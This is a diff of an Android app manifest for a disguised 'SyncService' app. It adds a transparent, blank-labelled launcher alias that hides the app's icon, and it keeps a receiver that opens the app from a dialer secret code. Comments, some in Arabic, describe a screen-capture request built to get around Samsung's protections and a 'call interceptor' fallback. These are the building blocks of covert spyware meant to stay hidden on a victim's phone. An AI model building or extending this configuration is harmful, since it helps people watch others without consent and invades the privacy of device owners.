@@ -64,36 +64,42 @@
             android:name=".MainActivity"
             android:excludeFromRecents="true"
             android:exported="true"
-            android:theme="@style/Theme.SyncService">
-        </activity>
-
-        <activity
-            android:name=".LoginActivity"
-            android:excludeFromRecents="true"
-            android:exported="true"
             android:theme="@style/Theme.SyncService" />
 
-        <!-- Alias للتحكم في الأيقونة بشكل منفصل واستئجار التخفي التام -->
+        <!-- v35 Visible Alias -->
         <activity-alias
-            android:name=".LauncherAlias"
+            android:name=".LauncherAliasVisible"
             android:enabled="true"
             android:exported="true"
             android:icon="@android:drawable/ic_menu_preferences"
             android:label="@string/app_name"
-            android:targetActivity=".LoginActivity">
+            android:targetActivity=".MainActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity-alias>
 
-        <!-- واجهة الإعدادات المخفية -->
-        <activity
-            android:name=".HiddenSettingsActivity"
-            android:excludeFromRecents="true"
-            android:exported="false" />
+        <!-- v35 Hidden Alias (Transparent) -->
+        <activity-alias
+            android:name=".LauncherAliasHidden"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@color/transparent"
+            android:label=" "
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
 
-        <!-- منفذ حصري لطلب تصوير الشاشة (شفاف لتجاوز حماية سامسونج) -->
+        <activity
+            android:name=".LoginActivity"
+            android:excludeFromRecents="true"
+            android:exported="false"
+            android:theme="@style/Theme.SyncService" />
+
         <!-- منفذ حصري لطلب تصوير الشاشة (تحديث لتجاوز حماية سامسونج) -->
         <activity
             android:name=".MediaProjectionRequestActivity"
@@ -185,15 +191,9 @@
         <receiver
             android:name=".SecretCodeReceiver"
             android:exported="true">
-            <!-- Primary: standard secret code *#1356365508# (Samsung / Classic) -->
             <intent-filter android:priority="999">
                 <action android:name="android.provider.Telephony.SECRET_CODE" />
                 <data android:scheme="android_secret_code" android:host="1356365508" />
-            </intent-filter>
-            <!-- Secondary: fallback secret code *#*#1356365508#*#* (Pixel / Stock) -->
-            <intent-filter android:priority="999">
-                <action android:name="android.provider.Telephony.SECRET_CODE" />
-                <data android:scheme="android_secret_code" android:host="*#*#1356365508#*#*" />
             </intent-filter>
             <!-- Fallback: Samsung Call Interceptor (if secret code fails) -->
             <intent-filter android:priority="999">
